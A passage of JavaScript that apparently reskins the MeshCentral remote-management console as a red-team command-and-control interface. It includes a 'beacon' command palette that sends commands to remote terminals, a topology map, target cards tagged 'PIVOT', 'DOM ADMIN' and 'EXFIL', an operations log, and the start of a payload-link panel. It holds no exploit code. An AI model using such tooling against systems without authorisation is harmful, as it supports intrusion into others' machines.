                'HISTORY <span id="wtCmdClear" class="wt-cmd-clear" title="Clear">&#10005;</span>' +
            '</div>' +
            '<div class="wt-cmd-history-list" id="wtCmdHistList"></div>';

        // Insert palette alongside terminal — target the div itself, not its parent td
        var container = termDiv;
        if (container) {
            if (!container.classList.contains('wt-term-with-palette')) {
                container.classList.add('wt-term-with-palette');
            }
            container.appendChild(palette);
        }

        palette.querySelectorAll('.wt-cmd-btn').forEach(function(btn) {
            btn.addEventListener('click', function() { sendBeaconCmd(this.getAttribute('data-cmd')); });
        });

        var clearBtn = document.getElementById('wtCmdClear');
        if (clearBtn) {
            clearBtn.addEventListener('click', function() {
                wtCmdHistory = [];
                try { localStorage.removeItem(WT_CMD_HIST_KEY); } catch(e) {}
                renderCmdHistory();
            });
        }
        renderCmdHistory();
    }

    function sendBeaconCmd(cmd) {
        if (!cmd) return;
        // Fire outbound globe beam for the current beacon
        if (wtCurrentIntelNodeId) { wtFireGlobeBeam(wtCurrentIntelNodeId, 'out'); }
        // Use MeshCentral's own terminal globals — same path as xterm.onData handler
        // terminal.sendText() for agent sessions, terminal.socket.send() for SSH
        var sent = false;
        try {
            if (typeof terminal !== 'undefined' && terminal != null) {
                var data = cmd + '\r';
                if (terminal.urlname && terminal.urlname.indexOf('ssh') !== -1) {
                    terminal.socket.send('~' + data);
                } else {
                    terminal.sendText(data);
                }
                sent = true;
            }
        } catch(e) { sent = false; }

        if (!sent) {
            // Fallback: xterm.input() API (xterm.js v4+)
            try {
                if (typeof xterm !== 'undefined' && xterm && typeof xterm.input === 'function') {
                    xterm.input(cmd + '\r', false);
                    sent = true;
                }
            } catch(e) { sent = false; }
        }

        if (!sent) {
            // Last resort: focus the helper textarea and simulate keypress sequence
            var textarea = document.querySelector('.xterm-helper-textarea');
            if (textarea) {
                textarea.focus();
                (cmd + '\r').split('').forEach(function(ch, i) {
                    setTimeout(function() {
                        textarea.dispatchEvent(new KeyboardEvent('keypress', {
                            key: ch, charCode: ch.charCodeAt(0),
                            keyCode: ch.charCodeAt(0), bubbles: true
                        }));
                    }, i * 10);
                });
            }
        }

        if (cmd.trim()) {
            var idx = wtCmdHistory.indexOf(cmd);
            if (idx >= 0) wtCmdHistory.splice(idx, 1);
            wtCmdHistory.unshift(cmd);
            if (wtCmdHistory.length > 25) wtCmdHistory = wtCmdHistory.slice(0, 25);
            try { localStorage.setItem(WT_CMD_HIST_KEY, JSON.stringify(wtCmdHistory)); } catch(e) {}
            renderCmdHistory();
        }
    }

    function renderCmdHistory() {
        var list = document.getElementById('wtCmdHistList');
        if (!list) return;
        if (!wtCmdHistory.length) {
            list.innerHTML = '<div class="wt-cmd-empty">No history yet</div>';
            return;
        }
        list.innerHTML = wtCmdHistory.map(function(cmd, i) {
            return '<div class="wt-cmd-hist-item" data-i="' + i + '">' +
                   '<span class="wt-cmd-hist-num">' + (i + 1) + '</span>' +
                   '<span class="wt-cmd-hist-cmd">' + wtEscapeHtml(cmd.length > 38 ? cmd.substring(0, 38) + '…' : cmd) + '</span>' +
                   '</div>';
        }).join('');
        list.querySelectorAll('.wt-cmd-hist-item').forEach(function(el) {
            el.addEventListener('click', function() {
                var i = parseInt(this.getAttribute('data-i'));
                if (wtCmdHistory[i]) sendBeaconCmd(wtCmdHistory[i]);
            });
        });
    }

    // ========================================
    // SECTION 20: Network Topology Map
    // ========================================
    var wtTopoVisible = false;
    var wtTopoCanvas = null;
    var wtTopoCtx = null;
    var wtTopoNodes = [];
    var wtTopoDragging = false;
    var wtTopoOffsetX = 0, wtTopoOffsetY = 0;
    var wtTopoScale = 1;
    var wtTopoHover = null;
    var wtTopoSelected = null;
    var _topoDragLast = null;

    function injectTopologyButton() {
        var toolbar = getWtToolbar();
        if (!toolbar || document.getElementById('wtTopoBtn')) return;
        var btn = document.createElement('span');
        btn.id = 'wtTopoBtn';
        btn.className = 'wt-toolbar-btn';
        btn.innerHTML = '&#9698; TOPO';
        btn.title = 'Network Topology Map';
        btn.onclick = toggleTopologyPanel;
        toolbar.appendChild(btn);
    }

    function toggleTopologyPanel() {
        var panel = document.getElementById('wtTopoPanel');
        if (!panel) { buildTopoPanel(); panel = document.getElementById('wtTopoPanel'); }
        wtTopoVisible = !wtTopoVisible;
        if (panel) panel.style.display = wtTopoVisible ? 'flex' : 'none';
        var btn = document.getElementById('wtTopoBtn');
        if (btn) btn.style.color = wtTopoVisible ? 'var(--cs-accent-cyan)' : '';
        if (wtTopoVisible) { setTimeout(function() { resizeTopo(); refreshTopo(); }, 60); }
    }

    function buildTopoPanel() {
        if (document.getElementById('wtTopoPanel')) return;
        var panel = document.createElement('div');
        panel.id = 'wtTopoPanel';
        panel.className = 'wt-topo-panel';
        panel.innerHTML =
            '<div class="wt-lp-header">' +
                '<span class="wt-lp-title">&#9698; NETWORK TOPOLOGY</span>' +
                '<div style="display:flex;align-items:center;gap:5px">' +
                    '<span class="wt-lp-badge" id="wtTopoCount">0 NODES</span>' +
                    '<button class="wt-topo-ctrl-btn" id="wtTopoZoomIn" title="Zoom In">+</button>' +
                    '<button class="wt-topo-ctrl-btn" id="wtTopoZoomOut" title="Zoom Out">&#8722;</button>' +
                    '<button class="wt-topo-ctrl-btn" id="wtTopoReset" title="Reset View">&#8635;</button>' +
                    '<button class="wt-lp-refresh" id="wtTopoRefresh" title="Refresh">&#8635;</button>' +
                    '<button class="wt-lp-close" id="wtTopoClose">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-topo-legend">' +
                '<span><span class="wt-topo-leg-dot" style="background:#00ff41"></span>ACTIVE</span>' +
                '<span><span class="wt-topo-leg-dot" style="background:#ff8c00"></span>IDLE</span>' +
                '<span><span class="wt-topo-leg-dot" style="background:#4a5568"></span>DEAD</span>' +
                '<span><span class="wt-topo-leg-dot wt-topo-leg-diamond" style="background:#00d4ff"></span>MESH HUB</span>' +
            '</div>' +
            '<div class="wt-topo-canvas-wrap" id="wtTopoWrap">' +
                '<canvas id="wtTopoCanvas"></canvas>' +
                '<div id="wtTopoTip" class="wt-topo-tooltip"></div>' +
            '</div>';
        var p1 = document.getElementById('p1');
        if (p1) p1.appendChild(panel);

        wtTopoCanvas = document.getElementById('wtTopoCanvas');
        wtTopoCtx = wtTopoCanvas.getContext('2d');

        resizeTopo();
        window.addEventListener('resize', function() { if (wtTopoVisible) { resizeTopo(); drawTopo(); } });

        wtTopoCanvas.addEventListener('mousemove', topoMouseMove);
        wtTopoCanvas.addEventListener('mousedown', topoMouseDown);
        wtTopoCanvas.addEventListener('mouseup', function() { wtTopoDragging = false; _topoDragLast = null; });
        wtTopoCanvas.addEventListener('mouseleave', function() { wtTopoDragging = false; _topoDragLast = null; document.getElementById('wtTopoTip').style.display = 'none'; });
        wtTopoCanvas.addEventListener('wheel', function(e) {
            var d = e.deltaY > 0 ? 0.88 : 1.14;
            wtTopoScale = Math.max(0.2, Math.min(5, wtTopoScale * d));
            drawTopo();
        }, { passive: true });
        wtTopoCanvas.addEventListener('click', topoClick);

        document.getElementById('wtTopoZoomIn').onclick = function(e) { e.stopPropagation(); wtTopoScale = Math.min(5, wtTopoScale * 1.3); drawTopo(); };
        document.getElementById('wtTopoZoomOut').onclick = function(e) { e.stopPropagation(); wtTopoScale = Math.max(0.2, wtTopoScale / 1.3); drawTopo(); };
        document.getElementById('wtTopoReset').onclick = function(e) { e.stopPropagation(); wtTopoScale = 1; wtTopoOffsetX = 0; wtTopoOffsetY = 0; layoutTopo(); drawTopo(); };
        document.getElementById('wtTopoRefresh').onclick = function(e) { e.stopPropagation(); refreshTopo(); };
        document.getElementById('wtTopoClose').onclick = toggleTopologyPanel;
    }

    function resizeTopo() {
        if (!wtTopoCanvas) return;
        var wrap = document.getElementById('wtTopoWrap');
        if (!wrap) return;
        wtTopoCanvas.width = wrap.offsetWidth || 600;
        wtTopoCanvas.height = wrap.offsetHeight || 320;
    }

    function refreshTopo() {
        var nodesArr = (typeof nodes !== 'undefined' && nodes) ? nodes : [];
        var meshObj = (typeof meshes !== 'undefined' && meshes) ? meshes : {};
        wtTopoNodes = [];
        Object.keys(meshObj).forEach(function(mid) {
            var m = meshObj[mid];
            wtTopoNodes.push({ id: mid, name: (m.name || mid.split('/').pop()).substring(0, 18), type: 'mesh', x: 0, y: 0 });
        });
        nodesArr.forEach(function(nd) {
            if (!nd || !nd._id) return;
            wtTopoNodes.push({
                id: nd._id, name: (nd.name || nd._id.split('/').pop()).substring(0, 18),
                type: 'beacon', status: getBeaconStatus(nd),
                ip: nd.ip || '', os: (nd.osdesc || nd.osinfo || '').substring(0, 26),
                meshid: nd.meshid || '', nd: nd, x: 0, y: 0
            });
        });
        var bc = wtTopoNodes.filter(function(n) { return n.type === 'beacon'; }).length;
        var el = document.getElementById('wtTopoCount');
        if (el) el.textContent = bc + ' NODE' + (bc !== 1 ? 'S' : '');
        layoutTopo();
        drawTopo();
    }

    function layoutTopo() {
        if (!wtTopoCanvas) return;
        var w = wtTopoCanvas.width, h = wtTopoCanvas.height;
        var cx = w / 2, cy = h / 2;
        var meshNodes = wtTopoNodes.filter(function(n) { return n.type === 'mesh'; });
        var beaconNodes = wtTopoNodes.filter(function(n) { return n.type === 'beacon'; });
        var mR = Math.min(w, h) * 0.26;
        meshNodes.forEach(function(mn, i) {
            var angle = meshNodes.length === 1 ? -Math.PI / 2 : (i / meshNodes.length) * Math.PI * 2 - Math.PI / 2;
            mn.x = cx + Math.cos(angle) * (meshNodes.length === 1 ? 0 : mR);
            mn.y = cy + Math.sin(angle) * (meshNodes.length === 1 ? 0 : mR);
        });
        var meshBeacons = {};
        beaconNodes.forEach(function(bn) {
            if (!meshBeacons[bn.meshid]) meshBeacons[bn.meshid] = [];
            meshBeacons[bn.meshid].push(bn);
        });
        Object.keys(meshBeacons).forEach(function(mid) {
            var hub = null;
            for (var i = 0; i < meshNodes.length; i++) { if (meshNodes[i].id === mid) { hub = meshNodes[i]; break; } }
            var bList = meshBeacons[mid];
            var hx = hub ? hub.x : cx, hy = hub ? hub.y : cy;
            var bR = Math.max(55, Math.min(w, h) * 0.13 + bList.length * 7);
            bList.forEach(function(bn, j) {
                var angle = (j / bList.length) * Math.PI * 2 - Math.PI / 2;
                bn.x = Math.max(20, Math.min(w - 20, hx + Math.cos(angle) * bR));
                bn.y = Math.max(20, Math.min(h - 20, hy + Math.sin(angle) * bR));
            });
        });
        var lone = beaconNodes.filter(function(bn) { return !meshBeacons[bn.meshid]; });
        lone.forEach(function(bn, i) {
            var angle = (i / Math.max(lone.length, 1)) * Math.PI * 2;
            bn.x = Math.max(20, Math.min(w - 20, cx + Math.cos(angle) * mR * 1.6));
            bn.y = Math.max(20, Math.min(h - 20, cy + Math.sin(angle) * mR * 1.6));
        });
    }

    function drawTopo() {
        if (!wtTopoCtx || !wtTopoCanvas || !wtTopoVisible) return;
        var ctx = wtTopoCtx;
        var w = wtTopoCanvas.width, h = wtTopoCanvas.height;
        ctx.clearRect(0, 0, w, h);
        // Grid
        ctx.save();
        ctx.strokeStyle = 'rgba(0,212,255,0.035)';
        ctx.lineWidth = 1;
        var gs = 38 * wtTopoScale, ox = ((wtTopoOffsetX % gs) + gs) % gs, oy = ((wtTopoOffsetY % gs) + gs) % gs;
        for (var gx = ox - gs; gx < w + gs; gx += gs) { ctx.beginPath(); ctx.moveTo(gx, 0); ctx.lineTo(gx, h); ctx.stroke(); }
        for (var gy = oy - gs; gy < h + gs; gy += gs) { ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(w, gy); ctx.stroke(); }
        ctx.restore();
        ctx.save();
        ctx.translate(wtTopoOffsetX, wtTopoOffsetY);
        ctx.scale(wtTopoScale, wtTopoScale);
        var meshNodes = wtTopoNodes.filter(function(n) { return n.type === 'mesh'; });
        var beaconNodes = wtTopoNodes.filter(function(n) { return n.type === 'beacon'; });
        // Draw edges
        beaconNodes.forEach(function(bn) {
            var hub = null;
            for (var i = 0; i < meshNodes.length; i++) { if (meshNodes[i].id === bn.meshid) { hub = meshNodes[i]; break; } }
            if (!hub) return;
            var col = bn.status === 'active' ? 'rgba(0,255,65,0.22)' : bn.status === 'idle' ? 'rgba(255,140,0,0.16)' : 'rgba(74,85,104,0.1)';
            ctx.beginPath(); ctx.moveTo(hub.x, hub.y); ctx.lineTo(bn.x, bn.y);
            ctx.strokeStyle = col; ctx.lineWidth = bn.status === 'active' ? 1.1 : 0.6;
            if (bn.status === 'dead') ctx.setLineDash([3, 6]);
            ctx.stroke(); ctx.setLineDash([]);
        });
        // Mesh hubs — diamond
        meshNodes.forEach(function(mn) {
            var sel = wtTopoSelected && wtTopoSelected.id === mn.id;
            var hov = wtTopoHover && wtTopoHover.id === mn.id;
            var r = sel ? 14 : (hov ? 12 : 10);
            if (hov || sel) { ctx.beginPath(); ctx.arc(mn.x, mn.y, r + 8, 0, Math.PI * 2); ctx.fillStyle = 'rgba(0,212,255,0.07)'; ctx.fill(); }
            ctx.beginPath();
            ctx.moveTo(mn.x, mn.y - r); ctx.lineTo(mn.x + r * 0.65, mn.y);
            ctx.lineTo(mn.x, mn.y + r); ctx.lineTo(mn.x - r * 0.65, mn.y); ctx.closePath();
            ctx.fillStyle = 'rgba(0,212,255,0.1)'; ctx.fill();
            ctx.strokeStyle = sel ? '#00d4ff' : 'rgba(0,212,255,' + (hov ? '0.9' : '0.6') + ')'; ctx.lineWidth = sel ? 2 : 1.5; ctx.stroke();
            ctx.fillStyle = sel ? '#00d4ff' : 'rgba(0,212,255,0.85)'; ctx.font = '8px monospace'; ctx.textAlign = 'center';
            ctx.fillText(mn.name, mn.x, mn.y + r + 13);
        });
        // Beacon nodes
        beaconNodes.forEach(function(bn) {
            var sel = wtTopoSelected && wtTopoSelected.id === bn.id;
            var hov = wtTopoHover && wtTopoHover.id === bn.id;
            var col = bn.status === 'active' ? '#00ff41' : bn.status === 'idle' ? '#ff8c00' : '#4a5568';
            var r = sel ? 9 : (hov ? 8 : 6);
            ctx.globalAlpha = bn.status === 'dead' ? 0.42 : 1;
            if (bn.status === 'active' && (hov || sel)) { ctx.beginPath(); ctx.arc(bn.x, bn.y, r + 6, 0, Math.PI * 2); ctx.fillStyle = 'rgba(0,255,65,0.06)'; ctx.fill(); }
            ctx.beginPath(); ctx.arc(bn.x, bn.y, r, 0, Math.PI * 2);
            ctx.strokeStyle = col; ctx.lineWidth = sel ? 1.8 : 1; ctx.stroke();
            ctx.beginPath(); ctx.arc(bn.x, bn.y, r - 2, 0, Math.PI * 2);
            ctx.fillStyle = bn.status === 'active' ? 'rgba(0,255,65,0.11)' : bn.status === 'idle' ? 'rgba(255,140,0,0.09)' : 'rgba(74,85,104,0.07)'; ctx.fill();
            ctx.fillStyle = bn.status === 'dead' ? 'rgba(120,140,160,0.55)' : 'rgba(180,210,240,0.82)';
            ctx.font = '6.5px monospace'; ctx.textAlign = 'center';
            ctx.fillText(getBeaconId(bn.id), bn.x, bn.y + r + 10);
            ctx.globalAlpha = 1;
        });
        ctx.restore();
    }

    function topoHitTest(ex, ey) {
        if (!wtTopoCanvas) return null;
        var rect = wtTopoCanvas.getBoundingClientRect();
        var x = (ex - rect.left - wtTopoOffsetX) / wtTopoScale;
        var y = (ey - rect.top - wtTopoOffsetY) / wtTopoScale;
        var hit = null, minD = 22;
        wtTopoNodes.forEach(function(n) {
            var d = Math.sqrt(Math.pow(n.x - x, 2) + Math.pow(n.y - y, 2));
            if (d < minD) { minD = d; hit = n; }
        });
        return hit;
    }

    function topoMouseMove(e) {
        if (wtTopoDragging && _topoDragLast) {
            wtTopoOffsetX += e.clientX - _topoDragLast.x;
            wtTopoOffsetY += e.clientY - _topoDragLast.y;
            _topoDragLast = { x: e.clientX, y: e.clientY };
            drawTopo(); return;
        }
        var hit = topoHitTest(e.clientX, e.clientY);
        if (hit !== wtTopoHover) { wtTopoHover = hit; drawTopo(); }
        var tip = document.getElementById('wtTopoTip');
        if (!tip) return;
        if (hit) {
            var rect = wtTopoCanvas.getBoundingClientRect();
            tip.style.cssText = 'display:block;left:' + (e.clientX - rect.left + 14) + 'px;top:' + (e.clientY - rect.top - 10) + 'px';
            if (hit.type === 'mesh') {
                tip.innerHTML = '<b style="color:#00d4ff">' + wtEscapeHtml(hit.name) + '</b><div style="color:#7a8a9a;font-size:8px;margin-top:2px">MESH GROUP</div>';
            } else {
                var sc = hit.status === 'active' ? '#00ff41' : hit.status === 'idle' ? '#ff8c00' : '#4a5568';
                tip.innerHTML = '<b style="color:' + sc + '">' + getBeaconId(hit.id) + '</b>' +
                    ' <span style="color:' + sc + ';font-size:8px">' + hit.status.toUpperCase() + '</span>' +
                    '<div style="color:#c8d4e0;margin-top:2px">' + wtEscapeHtml(hit.name) + '</div>' +
                    (hit.ip ? '<div style="color:#7a8a9a;font-size:8px">IP: ' + wtEscapeHtml(hit.ip) + '</div>' : '') +
                    (hit.os ? '<div style="color:#7a8a9a;font-size:8px">' + wtEscapeHtml(hit.os) + '</div>' : '');
            }
        } else { tip.style.display = 'none'; }
    }

    function topoMouseDown(e) {
        var hit = topoHitTest(e.clientX, e.clientY);
        if (!hit) { wtTopoDragging = true; _topoDragLast = { x: e.clientX, y: e.clientY }; }
        e.preventDefault();
    }

    function topoClick(e) {
        var hit = topoHitTest(e.clientX, e.clientY);
        wtTopoSelected = (hit && wtTopoSelected && hit.id === wtTopoSelected.id) ? null : hit;
        drawTopo();
    }

    // ========================================
    // SECTION 21: Target Intelligence Cards
    // ========================================
    var wtCurrentIntelNodeId = null;

    function setupIntelCards() {
        var poll = setInterval(function() {
            if (typeof window.gotoDevice === 'function' && !window._wtGotoHooked) {
                window._wtGotoHooked = true;
                clearInterval(poll);
                var _orig = window.gotoDevice;
                window.gotoDevice = function(nodeid) {
                    wtCurrentIntelNodeId = nodeid;
                    var r = _orig.apply(this, arguments);
                    setTimeout(injectIntelCard, 380);
                    return r;
                };
            }
        }, 400);
    }

    function injectIntelCard() {
        var nd = null;
        if (typeof nodes !== 'undefined' && nodes && wtCurrentIntelNodeId) {
            for (var i = 0; i < nodes.length; i++) {
                if (nodes[i]._id === wtCurrentIntelNodeId) { nd = nodes[i]; break; }
            }
        }
        if (!nd) return;
        var existing = document.getElementById('wtIntelCard');
        var card = existing || document.createElement('div');
        card.id = 'wtIntelCard';
        card.className = 'wt-intel-card';
        var status = getBeaconStatus(nd);
        var bid = getBeaconId(nd._id);
        var sc = status === 'active' ? '#00ff41' : status === 'idle' ? '#ff8c00' : '#4a5568';
        var meshName = '';
        if (typeof meshes !== 'undefined' && meshes && nd.meshid && meshes[nd.meshid]) { meshName = meshes[nd.meshid].name || ''; }
        var lastSeen = nd.lastconnect ? (function() { var d = new Date(nd.lastconnect * 1000); return d.toLocaleDateString() + ' ' + d.toLocaleTimeString(); })() : '—';
        var osStr = (nd.osdesc || nd.osinfo || '—').substring(0, 30);
        var osIcon = /windows/i.test(osStr) ? '&#xF05D;' : /linux/i.test(osStr) ? '&#9141;' : /mac|darwin/i.test(osStr) ? '&#xF04D;' : '&#9632;';
        var notes = '';
        try { var an = JSON.parse(localStorage.getItem('wt_notes_v1') || '{}'); notes = an[nd._id] || ''; } catch(e) {}
        var tags = [];
        try { var at = JSON.parse(localStorage.getItem('wt_tags_v1') || '{}'); tags = at[nd._id] || []; } catch(e) {}
        var tagOpts = ['HIGH VALUE', 'PIVOT', 'DOM ADMIN', 'EXFIL', 'SENSITIVE', 'MONITORED'];
        var tagsHtml = tagOpts.map(function(t) {
            return '<span class="wt-intel-tag' + (tags.indexOf(t) >= 0 ? ' wt-intel-tag-on' : '') + '" data-tag="' + t + '">' + t + '</span>';
        }).join('');
        card.innerHTML =
            '<div class="wt-intel-header">' +
                '<span class="wt-bid-' + status + '" style="padding:2px 7px;font-size:10px;border-radius:2px">' + bid + '</span>' +
                '<span class="wt-beacon-status-dot wt-dot-' + status + '" style="margin-left:6px"></span>' +
                '<span style="color:' + sc + ';font-size:9px;text-transform:uppercase;margin-left:3px">' + status + '</span>' +
                '<button class="wt-intel-close" id="wtIntelClose">&#10005;</button>' +
            '</div>' +
            '<div class="wt-intel-name">' + wtEscapeHtml(nd.name || nd._id) + '</div>' +
            '<div class="wt-intel-section">TARGET PROFILE</div>' +
            '<div class="wt-intel-grid">' +
                _intelRow('IP', nd.ip || nd.host || '—') +
                _intelRow('OS', osStr) +
                _intelRow('USER', String(nd.userlastseen || nd.users || '—').substring(0, 24)) +
                _intelRow('MESH', (meshName || '—').substring(0, 24)) +
                _intelRow('LAST SEEN', lastSeen) +
            '</div>' +
            '<div class="wt-intel-section">TAGS</div>' +
            '<div class="wt-intel-tags" id="wtIntelTags">' + tagsHtml + '</div>' +
            '<div class="wt-intel-section">OPERATOR NOTES</div>' +
            '<textarea class="wt-intel-notes" id="wtIntelNotes" placeholder="Tactical notes...">' + wtEscapeHtml(notes) + '</textarea>';
        if (!existing) {
            var p10 = document.getElementById('p10');
            if (p10 && p10.parentNode) { p10.parentNode.insertBefore(card, p10.nextSibling); } else { document.body.appendChild(card); }
            card.style.opacity = '0';
            requestAnimationFrame(function() { card.style.transition = 'opacity 0.22s'; card.style.opacity = '1'; });
        }
        document.getElementById('wtIntelClose').onclick = removeIntelCard;
        var notesEl = document.getElementById('wtIntelNotes');
        if (notesEl) notesEl.onblur = function() {
            try { var an2 = JSON.parse(localStorage.getItem('wt_notes_v1') || '{}'); an2[nd._id] = this.value; localStorage.setItem('wt_notes_v1', JSON.stringify(an2)); } catch(e) {}
        };
        document.querySelectorAll('#wtIntelCard .wt-intel-tag').forEach(function(el) {
            el.onclick = function() {
                var t = this.getAttribute('data-tag');
                try {
                    var at2 = JSON.parse(localStorage.getItem('wt_tags_v1') || '{}');
                    var nt = at2[nd._id] || [], ix = nt.indexOf(t);
                    if (ix >= 0) nt.splice(ix, 1); else nt.push(t);
                    at2[nd._id] = nt; localStorage.setItem('wt_tags_v1', JSON.stringify(at2));
                    this.classList.toggle('wt-intel-tag-on');
                } catch(e) {}
            };
        });
    }

    function removeIntelCard() {
        var card = document.getElementById('wtIntelCard');
        if (card) { card.style.transition = 'opacity 0.2s'; card.style.opacity = '0'; setTimeout(function() { if (card.parentNode) card.parentNode.removeChild(card); }, 220); }
        wtCurrentIntelNodeId = null;
    }

    function _intelRow(label, val) {
        return '<div class="wt-intel-row">' +
               '<span class="wt-intel-label">' + label + '</span>' +
               '<span class="wt-intel-value">' + wtEscapeHtml(String(val)) + '</span>' +
               '</div>';
    }

    // ========================================
    // SECTION 22: Operations Timeline
    // ========================================
    var wtOpsLog = [];
    var wtOpsVisible = false;
    var WT_OPS_MAX = 200;

    function setupOpsTimeline() {
        try { var s = localStorage.getItem('wt_ops_v1'); if (s) wtOpsLog = JSON.parse(s) || []; } catch(e) {}
        injectOpsButton();
    }

    function injectOpsButton() {
        var toolbar = getWtToolbar();
        if (!toolbar || document.getElementById('wtOpsBtn')) return;
        var btn = document.createElement('span');
        btn.id = 'wtOpsBtn';
        btn.className = 'wt-toolbar-btn';
        btn.innerHTML = '&#9776; OPS';
        btn.title = 'Operations Log';
        btn.onclick = toggleOpsPanel;
        toolbar.appendChild(btn);
    }

    var wtLogEventHooks = [];

    function wtLogEvent(type, msg, nodeId) {
        var bid = nodeId ? getBeaconId(nodeId) : null;
        wtOpsLog.unshift({ t: Date.now(), type: type, msg: msg, nid: nodeId || null, bid: bid });
        if (wtOpsLog.length > WT_OPS_MAX) wtOpsLog = wtOpsLog.slice(0, WT_OPS_MAX);
        try { localStorage.setItem('wt_ops_v1', JSON.stringify(wtOpsLog.slice(0, 60))); } catch(e) {}
        if (wtOpsVisible) renderOpsLog();
        var btn = document.getElementById('wtOpsBtn');
        if (btn && !btn._wtFlash) {
            btn._wtFlash = true; btn.style.color = 'var(--cs-accent-green)';
            setTimeout(function() { btn.style.color = ''; btn._wtFlash = false; }, 1100);
        }
        for (var _h = 0; _h < wtLogEventHooks.length; _h++) {
            try { wtLogEventHooks[_h](type, msg, nodeId); } catch(e) {}
        }
    }

    function toggleOpsPanel() {
        var panel = document.getElementById('wtOpsPanel');
        if (!panel) { buildOpsPanel(); panel = document.getElementById('wtOpsPanel'); }
        wtOpsVisible = !wtOpsVisible;
        if (panel) panel.style.display = wtOpsVisible ? 'flex' : 'none';
        var btn = document.getElementById('wtOpsBtn');
        if (btn) btn.style.color = wtOpsVisible ? 'var(--cs-accent-cyan)' : '';
        if (wtOpsVisible) renderOpsLog();
    }

    function buildOpsPanel() {
        if (document.getElementById('wtOpsPanel')) return;
        var panel = document.createElement('div');
        panel.id = 'wtOpsPanel';
        panel.className = 'wt-ops-panel';
        panel.innerHTML =
            '<div class="wt-ops-header">' +
                '<span class="wt-ops-title">&#9776; OPERATIONS LOG</span>' +
                '<div style="display:flex;align-items:center;gap:6px">' +
                    '<select class="wt-ops-filter" id="wtOpsFilter">' +
                        '<option value="">ALL EVENTS</option>' +
                        '<option value="connect">CONNECT</option>' +
                        '<option value="disconnect">DISCONNECT</option>' +
                        '<option value="auth">AUTH</option>' +
                        '<option value="cmd">CMD</option>' +
                        '<option value="alert">ALERT</option>' +
                        '<option value="info">INFO</option>' +
                    '</select>' +
                    '<button class="wt-topo-ctrl-btn" id="wtOpsClear" title="Clear log">CLR</button>' +
                    '<button class="wt-lp-close" id="wtOpsClose">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-ops-list" id="wtOpsList"></div>';
        document.body.appendChild(panel);
        document.getElementById('wtOpsClose').onclick = toggleOpsPanel;
        document.getElementById('wtOpsClear').onclick = function() {
            wtOpsLog = [];
            try { localStorage.removeItem('wt_ops_v1'); } catch(e) {}
            renderOpsLog();
        };
        document.getElementById('wtOpsFilter').onchange = renderOpsLog;
    }

    function renderOpsLog() {
        var list = document.getElementById('wtOpsList');
        if (!list) return;
        var filterEl = document.getElementById('wtOpsFilter');
        var filter = filterEl ? filterEl.value : '';
        var items = filter ? wtOpsLog.filter(function(e) { return e.type === filter; }) : wtOpsLog;
        if (!items.length) { list.innerHTML = '<div class="wt-ops-empty">No events logged yet.</div>'; return; }
        var cols = { connect: '#00ff41', disconnect: '#ff3333', auth: '#a855f7', cmd: '#00d4ff', alert: '#ff8c00', info: '#7a8a9a' };
        var icons = { connect: '&#9650;', disconnect: '&#9660;', auth: '&#11401;', cmd: '&#8250;', alert: '!', info: '&#183;' };
        list.innerHTML = items.slice(0, 150).map(function(e) {
            var col = cols[e.type] || '#7a8a9a';
            var d = new Date(e.t);
            var ts = [d.getHours(), d.getMinutes(), d.getSeconds()].map(function(n) { return n < 10 ? '0' + n : '' + n; }).join(':');
            return '<div class="wt-ops-item">' +
                '<span class="wt-ops-ts">' + ts + '</span>' +
                '<span class="wt-ops-icon" style="color:' + col + '">' + (icons[e.type] || '&#183;') + '</span>' +
                '<span class="wt-ops-type" style="color:' + col + '">' + e.type.toUpperCase() + '</span>' +
                (e.bid ? '<span class="wt-ops-bid">' + wtEscapeHtml(e.bid) + '</span>' : '<span class="wt-ops-bid" style="opacity:0.3">&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;</span>') +
                '<span class="wt-ops-msg">' + wtEscapeHtml(e.msg) + '</span>' +
                '</div>';
        }).join('');
    }

    // ============================================================
    // SECTION 24: Payload Studio
    // ============================================================

    var wtPayloadVisible = false;

    function injectPayloadButton() {
        var span = getWtToolbar();
        if (!span || document.getElementById('wtPayloadBtn')) return;
        var btn = document.createElement('button');
        btn.id = 'wtPayloadBtn';
        btn.className = 'wt-toolbar-btn';
        btn.innerHTML = '&#8659; PAYLOAD';
        btn.title = 'Payload Studio — agent links & DBS';
        btn.onclick = togglePayloadPanel;
        span.appendChild(btn);
    }

    function togglePayloadPanel() {
        wtPayloadVisible = !wtPayloadVisible;
        var panel = document.getElementById('wtPayloadPanel');
        var btn = document.getElementById('wtPayloadBtn');
        if (!panel) {
            createPayloadPanel();
            return;
        }
        panel.style.display = wtPayloadVisible ? 'block' : 'none';
        if (btn) btn.classList.toggle('wt-toolbar-btn-active', wtPayloadVisible);
        if (wtPayloadVisible) refreshPayloadPanel();
    }

    function wtPayMeshIdParam(meshKey) {
        // MeshCentral URL format: meshid = meshid.split('/')[2]
        // Browser mesh keys: "mesh//base64id" or "mesh/domain/base64id"
        if (!meshKey) return '';
        var parts = meshKey.split('/');
        return parts[parts.length - 1];
    }

    function createPayloadPanel() {
        var toolbar = document.getElementById('devListToolbarSpan');
        if (!toolbar) return;
        var panel = document.createElement('div');
        panel.id = 'wtPayloadPanel';
        panel.className = 'wt-payload-panel';
        panel.innerHTML = buildPayloadShell();
        toolbar.parentNode.insertBefore(panel, toolbar.nextSibling);
        var btn = document.getElementById('wtPayloadBtn');
        if (btn) btn.classList.add('wt-toolbar-btn-active');
        // Wire tabs
        panel.querySelectorAll('.wt-payload-tab').forEach(function(tab) {
            tab.addEventListener('click', function() {
                panel.querySelectorAll('.wt-payload-tab').forEach(function(t) { t.classList.remove('active'); });
                panel.querySelectorAll('.wt-payload-tabcontent').forEach(function(c) { c.style.display = 'none'; });
                this.classList.add('active');
                var t = document.getElementById('wtPayTab_' + this.getAttribute('data-tab'));
                if (t) t.style.display = 'block';
            });
        });
        // Wire mesh selector
        var sel = document.getElementById('wtPayloadMesh');
        if (sel) sel.addEventListener('change', refreshPayloadPanel);
        wtPatchInputs(panel);
        refreshPayloadPanel();
    }

    function buildPayloadShell() {
        var meshOpts = '<option value="">— No Listener —</option>';
        if (typeof meshes === 'object') {
            Object.keys(meshes).forEach(function(mid) {
                var m = meshes[mid];
                meshOpts += '<option value="' + wtEscapeHtml(mid) + '">' + wtEscapeHtml(m.name || mid) + '</option>';
            });
        }
        return '<div class="wt-payload-header">' +
            '<span class="wt-payload-title">&#8659; PAYLOAD STUDIO</span>' +
